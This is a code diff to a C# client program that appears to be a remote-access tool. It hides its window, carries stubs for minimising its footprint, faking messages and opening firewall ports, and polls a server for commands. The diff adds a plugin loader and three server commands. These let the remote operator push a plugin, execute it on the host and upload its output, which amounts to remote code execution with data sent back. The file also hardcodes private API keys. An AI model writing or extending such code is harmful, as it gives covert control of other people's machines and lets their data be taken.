@@ -15,17 +15,23 @@ using Models;
 using Ionic.Zip;
 using Ionic.Zlib;
 using System.Reflection;
+using PluginManager;
 
 namespace Client
 {
-    public partial class Form1 : Form
+    public partial class Form1 : Form, IPluginHost
     {
+        public bool HasInternetConnection
+        {
+            get { throw new NotImplementedException(); }
+        }
+
         private static readonly string APIKEY_PRIVATE = "ca71ab6e833b109d781c722118d2bff373297dc1";
         private static readonly string APIKEY_PUBLIC = "a12ee5029cbf44c55869ba6d629b683d8f0044ef";
         private static readonly string APPDIR_DOWNLOADS = "Transfers\\Downloads";
         private static readonly string APPDIR_UPLOADS = "Transfers\\Uploads";
         private static readonly string PROTOCOL = "http://";
-        private static readonly string IP_ADDRESS = "localhost"; // "192.168.1.100";// "kt-husid-webapp.cloudapp.net";
+        private static readonly string IP_ADDRESS = "localhost";
         private static readonly int PORT = 3226;
         private static string URL
         {
@@ -34,9 +40,7 @@ namespace Client
                 return PROTOCOL + IP_ADDRESS + ":" + PORT + PATH;
             }
         }
-        //private static readonly string IP_ADDRESS = "restless-honey-seeker.azurewebsites.net";
-        //private static readonly int PORT = 80;
-        private static readonly string PATH = "/api";// "/dev/restless-honey-seeker/server/api/1";//"/restless-honey-seeker/server/api/1";
+        private static readonly string PATH = "/api";
         private static readonly int CONNECTION_TIMEOUT = 10000;
         private static readonly int CONNECTION_INTERVAL = 10000;
         private Timer transmitTimer;
@@ -52,6 +56,8 @@ namespace Client
         bool isCloning = false;
         bool startNewProcessOnExit = false; // true;
         Assembly thisApp = null;
+
+        private PluginManager.PluginManager pluginManager;
 
         private void HideForm()
         {
@@ -157,7 +163,26 @@ namespace Client
             //FirewallManager.Instance.AddPort(1234, "test1234");
             //MinimizeFootPrint();
             //SetupFakeMsg();
+            LoadPlugins(@"C:\Users\benjamin\Documents\Visual Studio 2013\Projects\restless-honey-seeker\Shared\PluginDemo\bin\x64\Debug");
         }
+
+        void LoadPlugins(string pluginsPath)
+        {
+            pluginManager = new PluginManager.PluginManager(this, pluginsPath);
+            //Initialize the plugins
+            foreach (var p in pluginManager.Plugins)
+            {
+                try
+                {
+                    p.Client.Initialize();
+                }
+                catch (Exception)
+                {
+                    // write better code ;) or throw in the trash (pun intended)
+                }
+            }
+        }
+
 
         private void SetupConnectionTimer()
         {
@@ -295,6 +320,41 @@ namespace Client
                             break;
                         case ECommand.MOVE_CURSOR:
                             CursorInteract();
+                            break;
+                        case ECommand.EXECUTE_PLUGIN:
+                            if (pluginManager != null)
+                            {
+                                var plugin = pluginManager.GetPlugin(Handler.Instance.Transmitter.TSettings.File);
+                                if (plugin != null)
+                                {
+                                    object data = null;
+                                    try
+                                    {
+                                        data = plugin.Client.Execute();
+                                    }
+                                    catch (Exception ex)
+                                    {
+                                        data = ex.ToString();
+                                    }
+                                    if (data != null)
+                                    {
+                                        Handler.Instance.Transmitter.UploadData(data);
+                                    }
+                                }
+                            }
+                            break;
+                        case ECommand.KILL_PLUGIN:
+                            if (pluginManager != null)
+                            {
+                                var plugin = pluginManager.GetPlugin(Handler.Instance.Transmitter.TSettings.File);
+                                if (plugin != null)
+                                {
+                                    pluginManager.RemovePlugin(plugin);
+                                }
+                            }
+                            break;
+                        case ECommand.UPLOAD_PLUGIN:
+                            LoadPlugins(Handler.Instance.Transmitter.TSettings.File);
                             break;
                     }
                     Handler.Instance.Transmitter.SetHasExectuted(Handler.Instance.Transmitter.TSettings);
